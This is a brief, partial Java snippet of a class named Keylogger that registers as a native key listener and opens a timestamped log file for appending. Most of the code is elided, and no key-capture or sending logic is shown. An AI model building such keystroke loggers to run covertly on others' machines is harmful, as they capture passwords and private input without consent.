...
public class Keylogger implements NativeKeyListener
{
    ...
    public Keylogger()
    {
        try
        {
            // Formatting the current date and time. We can't use the fn below as it is of incorrect format.
            ...
            output = new FileWriter(fileName, true); // true means the file is appended, but since I am now creating new files everytime, it doesn't matter.
        } catch (IOException e)
        {
            e.printStackTrace();
        }
